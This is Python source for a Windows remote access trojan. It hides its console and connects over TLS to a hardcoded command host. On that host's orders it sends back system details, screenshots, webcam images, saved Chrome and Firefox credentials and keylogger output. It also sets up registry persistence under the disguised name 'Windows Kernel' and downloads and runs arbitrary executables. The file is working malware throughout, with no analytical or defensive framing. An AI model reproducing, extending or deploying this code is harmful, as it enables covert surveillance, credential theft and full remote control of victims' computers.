from Modules import ChromeStealer
from Modules import FirefoxStealer
from Modules import keylogger
from SimpleCV import Image, Camera
from SSLCertificate import ReturnCertificate
import multiprocessing
from win32api import GetSystemMetrics
import win32console,win32gui
import struct
import threading
import thread
import tempfile
import subprocess
import ctypes
import winreg
import random
import urllib2
import socket
import platform
import string
import ssl
import sys
import wx
import os

MB_OK = 0x0
MB_OKCXL = 0x01
MB_YESNOCXL = 0x03
MB_YESNO = 0x04
ICON_EXLAIM=0x30
ICON_INFO = 0x40
ICON_STOP = 0x10

KeyloggerProcessList = [ multiprocessing.Process(target=keylogger.StartKeylogger) ]
LogFile = os.path.join(os.getenv("APPDATA"), "keylogs.txt")

def HideConsole():
	window = win32console.GetConsoleWindow()
	win32gui.ShowWindow(window,0)
	return True

def DoPersistence():
    try:
        pathtoexe = os.path.dirname(os.path.realpath(__file__) + "\\" + os.path.basename(__file__))
        keyval=r"Software\Microsoft\Windows\CurrentVersion\Run"
        if not os.path.exists("keyval"):
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER,keyval)
        Registrykey= winreg.OpenKey(winreg.HKEY_CURRENT_USER, keyval, 0,winreg.KEY_WRITE)
        winreg.SetValueEx(Registrykey,"Windows Kernel",0,winreg.REG_SZ,pathtoexe)
        winreg.CloseKey(Registrykey)
    except WindowsError:
        print("failed!")

def RandomString(length):
        AvailableChars = string.ascii_letters
        FinalString = ""
        Counter = 0
        while(Counter != length):
            FinalString += AvailableChars[random.randint(0, len(AvailableChars)-1)]
            Counter += 1
        return FinalString
def TakeScreenshot(Path):
    try:
        app = wx.App() 
        screen = wx.ScreenDC()
        size = screen.GetSize()
        bmp = wx.Bitmap(size[0], size[1])
        mem = wx.MemoryDC(bmp)
        mem.Blit(0, 0, size[0], size[1], screen, 0, 0)
        del(mem)
        bmp.SaveFile(Path, wx.BITMAP_TYPE_PNG)
        del(screen)
        del(size)
        del(bmp)
        del(app)
        return True
    except:
        return False

def DumpKeylogs():
    if(os.path.isfile(LogFile)):
        Fl = open(LogFile, 'r')
        Data = Fl.read()
        Fl.close()
        return Data
    else:
        return ""

def TakeWebshot(Path, Width, Height):
    try:
        cam = Camera(prop_set={"width": Width,"height": Height})
        img = cam.getImage()
        img.save(Path)
        del(cam)
        del(img)
        return True
    except:
        return False

def SendFile(WrappedSocket, FileToSend):
    in_file = open(FileToSend, "rb")
    while(True): 
       data = in_file.readline(512)
       if(not data):
          sendmessage(WrappedSocket, "finished")
          break
       sendmessage(WrappedSocket, data)
    in_file.close()

def ReceiveFile(WrappedSocket, FilePath):
    out_file = open(FilePath, "wb")
    while(True):
        data = recvmessage(WrappedSocket)
        if(data == "finished"):
            break
        out_file.write(data)
    out_file.close()

def sendmessage(sock, data):
    length = len(data)
    sock.sendall(struct.pack('!I', length))
    sock.sendall(data)

def recvmessage(sock):
    lengthbuf = recvall(sock, 4)
    length, = struct.unpack('!I', lengthbuf)
    return recvall(sock, length)

def recvall(sock, count):
    buf = b''
    while count:
        newbuf = sock.recv(count)
        if not newbuf: return None
        buf += newbuf
        count -= len(newbuf)
    return buf

def ShowMessageBox(Title, Message, MessageBoxButtons, MessageBoxIcon):
    ctypes.windll.user32.MessageBoxA(None, Message, Title, MessageBoxButtons | MessageBoxIcon)
    
def connect(CertificatePath):
     try:
        hostname = "pyfat.001www.com"; # Here goes your hostname
        address = socket.gethostbyname(hostname)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
        WrappedSocket = ssl.wrap_socket(s, ca_certs = CertificatePath, cert_reqs=ssl.CERT_REQUIRED)
        WrappedSocket.connect((address, 1605))   
        while True:                                  
            command =  recvmessage(WrappedSocket)
            if (command == "terminate"):   
                WrappedSocket.close()
                os.remove(CertificatePath)
                break
            elif(command == "sysinfo"):
                SystemInformation = "\nOS: " + platform.system() + "\nFull OS Name: " + platform.platform() + "\nComputer Name: " + os.environ['COMPUTERNAME'] + "\nArchitecture: " + platform.machine() + "\nProcessor Name: " + platform.processor() + "\n"
                sendmessage(WrappedSocket, SystemInformation)
            elif(command == "screenshot"):
                result = TakeScreenshot("screenshot.png")
                if(result == True):
                    sendmessage(WrappedSocket, "OK")
                    SendFile(WrappedSocket, "screenshot.png")
                else:
                    sendmessage(WrappedSocket, "NO")
                if(os.path.isfile("screenshot.png")):
                    os.remove("screenshot.png")
            elif(command == "webshot"):
                result = TakeWebshot("webshot.jpg", GetSystemMetrics(0), GetSystemMetrics(1))
                if(result == True):
                    sendmessage(WrappedSocket, "OK")
                    SendFile(WrappedSocket, "webshot.jpg")
                else:
                    sendmessage(WrappedSocket, "NO")
                if(os.path.isfile("webshot.jpg")):
                    os.remove("webshot.jpg")
            elif(command == "persistence"):
                DoPersistence()
            elif(command == "messagebox"):
                Message = recvmessage(WrappedSocket)
                Title = recvmessage(WrappedSocket)
                MessageBoxButtons = recvmessage(WrappedSocket)
                MessageBoxIcon = recvmessage(WrappedSocket)
                ButtonsChoice = MB_OK
                IconChoice = ICON_INFO
                
                if(MessageBoxButtons == "YesNo"):
                    ButtonsChoice = MB_YESNO
                elif(MessageBoxButtons == "OK"):
                    ButtonsChoice = MB_OK
                elif(MessageBoxButtons == "YesNoCancel"):
                    ButtonsChoice = MB_YESNOCXL
                elif(MessageBoxButtons == "OkCancel"):
                    ButtonsChoice = MB_OKCXL

                if(MessageBoxIcon == "exclamation"):
                    IconChoice = ICON_EXLAIM
                elif(MessageBoxButtons == "info"):
                    IconChoice = ICON_INFO
                elif(MessageBoxIcon == "error"):
                    IconChoice = ICON_STOP
                thread.start_new_thread(ShowMessageBox, (Title, Message, ButtonsChoice, IconChoice))
            elif(command == "credgather"):
                ChromeCredentials = ""
                FirefoxCredentials = ""
                try:
                    ChromeCredentials = ChromeStealer.RunChromeStealer()
                except:
                    ChromeCredentials = "No Chrome Credentials Found"

                try:
                    FirefoxCredentials = FirefoxStealer.RunFirefoxStealer()
                except:
                    FirefoxCredentials = "No Firefox Credentials Found"
                sendmessage(WrappedSocket, ChromeCredentials)
                sendmessage(WrappedSocket, FirefoxCredentials)
            elif(command == "uploadexecute"):
                FileName = RandomString(6) + ".exe"
                while(os.path.isfile(FileName)):
                    FileName = RandomString(6) + ".exe"
                ReceiveFile(WrappedSocket, FileName)
                subprocess.Popen(FileName)
            elif(command == "keylogger_start"):
                if(os.path.isfile(LogFile)):
                    os.remove(LogFile)
                KeyloggerProcessList[0].start()
            elif(command == "keylogger_stop"):
                KeyloggerProcessList[0].terminate()
                KeyloggerProcessList[0].join()
                del(KeyloggerProcessList[0])
                KeyloggerProcessList.insert(1, multiprocessing.Process(target=keylogger.StartKeylogger))
                os.remove(LogFile)
            elif(command == "keylog_dump"):
                if(KeyloggerProcessList[0].is_alive()):
                    DumpData = DumpKeylogs()
                    if(DumpData == ""):
                        sendmessage(WrappedSocket, "No keylogs found!")
                    else:
                        sendmessage(WrappedSocket, DumpData)
                else:
                    sendmessage(WrappedSocket, "Internal Error! Keylogger process not found!")
     except:
         WrappedSocket.close()
         connect(CertificatePath)

if __name__ == '__main__':
    HideConsole()
    Tempfile = tempfile.NamedTemporaryFile(delete=False)
    Tempfile.close()
    CreateCertFile = open(Tempfile.name, "w")
    CreateCertFile.write(ReturnCertificate())
    CreateCertFile.close()
    connect(Tempfile.name)